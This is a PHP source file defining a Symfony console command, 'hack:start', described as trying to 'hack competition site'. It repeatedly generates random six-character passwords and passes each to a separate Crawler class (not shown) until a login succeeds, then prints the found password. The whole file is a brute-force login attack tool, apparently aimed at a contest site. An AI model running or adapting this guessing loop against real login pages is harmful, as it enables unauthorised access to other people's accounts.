<?php

namespace D8Hack;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;

/**
 * Provides a Symfony console command to attempt to login.
 * @package D8Hack
 */
class HackCommand extends Command
{

  /**
   * Crawler instance.
   *
   * @var \D8Hack\Crawler;
   */
  protected $crawler;

  /**
   * Previous password attempts.
   *
   * @var array
   */
  protected $attempts;

  /**
   * Configures the command.
   */
  protected function configure()
  {
    $this
      ->setName('hack:start')
      ->setDescription('Try to hack competition site');
    ;
  }

  /**
   * Generates a random password.
   *
   * @param int $length
   *   Password length.
   *
   * @return string
   *   Generated password
   */
  protected function generatePassword($length = 6) {
    $str = '';
    for ($i = 0; $i < $length; $i++) {
      $str .= chr(mt_rand(32, 126));
    }
    return $str;
  }

  /**
   * Executes the command.
   *
   * @param \Symfony\Component\Console\Input\InputInterface $input
   *   Input interface
   * @param \Symfony\Component\Console\Output\OutputInterface $output
   *   Output interface
   *
   * @return void
   */
  protected function execute(InputInterface $input, OutputInterface $output) {
    $this->crawler = Crawler::create();

    $password = $found = FALSE;
    while (!$found) {
      while (!$password || isset($this->attempts[$password])) {
        $password = $this->generatePassword();
      }
      $output->writeln(sprintf('Trying: %s', $password));
      if ($found = $this->crawler->doIt($password, $output)) {
        $output->writeln(sprintf('PASSWORD IS: %s', $password));
      }
      $this->attempts[$password] = 1;
    }
  }
}
